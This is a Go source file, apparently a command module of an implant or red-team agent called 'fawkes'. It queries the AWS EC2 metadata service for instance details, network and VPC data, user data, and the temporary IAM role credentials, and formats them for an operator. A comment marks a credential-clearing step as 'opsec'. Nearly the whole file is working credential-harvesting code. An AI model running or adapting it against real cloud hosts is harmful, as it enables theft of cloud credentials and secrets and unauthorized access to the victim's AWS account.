package commands

import (
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// --- AWS ---

func awsGetIMDSv2Token(timeout time.Duration) string {
	return metadataPut(awsTokenURL, timeout, map[string]string{
		"X-aws-ec2-metadata-token-ttl-seconds": "21600",
	})
}

func awsHeaders(timeout time.Duration) map[string]string {
	if token := awsGetIMDSv2Token(timeout); token != "" {
		return map[string]string{"X-aws-ec2-metadata-token": token}
	}
	return nil
}

func awsDumpAll(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== AWS EC2 Metadata ===\n")
	h := awsHeaders(timeout)

	paths := []struct {
		label, path string
	}{
		{"Instance ID", "instance-id"},
		{"Instance Type", "instance-type"},
		{"AMI ID", "ami-id"},
		{"Hostname", "hostname"},
		{"Local IPv4", "local-ipv4"},
		{"Public IPv4", "public-ipv4"},
		{"Public Hostname", "public-hostname"},
		{"Region", "placement/region"},
		{"Availability Zone", "placement/availability-zone"},
		{"MAC", "mac"},
		{"Security Groups", "security-groups"},
		{"IAM Role", "iam/info"},
	}

	for _, p := range paths {
		if val := metadataGet(awsMetaURL+p.path, timeout, h); val != "" {
			sb.WriteString(fmt.Sprintf("  %-22s %s\n", p.label+":", val))
		}
	}

	// IAM credentials
	sb.WriteString("\n")
	sb.WriteString(awsGetCreds(timeout))

	// User data
	sb.WriteString("\n")
	sb.WriteString(awsGetUserdata(timeout))

	return sb.String()
}

func awsGetCreds(timeout time.Duration) string {
	var sb strings.Builder
	h := awsHeaders(timeout)

	roles := metadataGet(awsCredsURL, timeout, h)
	if roles == "" {
		sb.WriteString("[*] AWS: No IAM role attached\n")
		return sb.String()
	}

	for _, role := range strings.Split(roles, "\n") {
		role = strings.TrimSpace(role)
		if role == "" {
			continue
		}
		sb.WriteString(fmt.Sprintf("[+] AWS IAM Role: %s\n", role))
		creds := metadataGet(awsCredsURL+role, timeout, h)
		if creds != "" {
			sb.WriteString(formatAWSCredsJSON(creds))
			structs.ZeroString(&creds) // opsec: clear IAM credentials JSON
		}
	}
	return sb.String()
}

func awsGetIdentity(timeout time.Duration) string {
	var sb strings.Builder
	h := awsHeaders(timeout)

	doc := metadataGet(awsIdentityURL, timeout, h)
	if doc == "" {
		sb.WriteString("[-] AWS: Could not retrieve identity document\n")
		return sb.String()
	}

	sb.WriteString("[+] AWS Instance Identity Document:\n")
	sb.WriteString(formatAWSIdentityJSON(doc))
	return sb.String()
}

func awsGetUserdata(timeout time.Duration) string {
	var sb strings.Builder
	h := awsHeaders(timeout)

	ud := metadataGet(awsUserdataURL, timeout, h)
	if ud == "" {
		sb.WriteString("[*] AWS: No user-data configured\n")
	} else {
		sb.WriteString("[+] AWS User Data:\n")
		sb.WriteString(truncate(ud, 4096))
		sb.WriteString("\n")
	}
	return sb.String()
}

func awsGetNetwork(timeout time.Duration) string {
	var sb strings.Builder
	h := awsHeaders(timeout)

	sb.WriteString("[+] AWS Network:\n")
	for _, item := range []struct{ label, path string }{
		{"Local IPv4", "local-ipv4"},
		{"Public IPv4", "public-ipv4"},
		{"MAC", "mac"},
		{"VPC ID", "network/interfaces/macs/"},
		{"Subnet ID", "network/interfaces/macs/"},
	} {
		if val := metadataGet(awsMetaURL+item.path, timeout, h); val != "" {
			sb.WriteString(fmt.Sprintf("    %-18s %s\n", item.label+":", val))
		}
	}

	// Get network interface details via MAC
	mac := metadataGet(awsMetaURL+"mac", timeout, h)
	if mac != "" {
		macPath := fmt.Sprintf("network/interfaces/macs/%s/", mac)
		for _, item := range []struct{ label, subpath string }{
			{"VPC ID", "vpc-id"},
			{"Subnet ID", "subnet-id"},
			{"Security Groups", "security-group-ids"},
		} {
			if val := metadataGet(awsMetaURL+macPath+item.subpath, timeout, h); val != "" {
				sb.WriteString(fmt.Sprintf("    %-18s %s\n", item.label+":", val))
			}
		}
	}

	return sb.String()
}
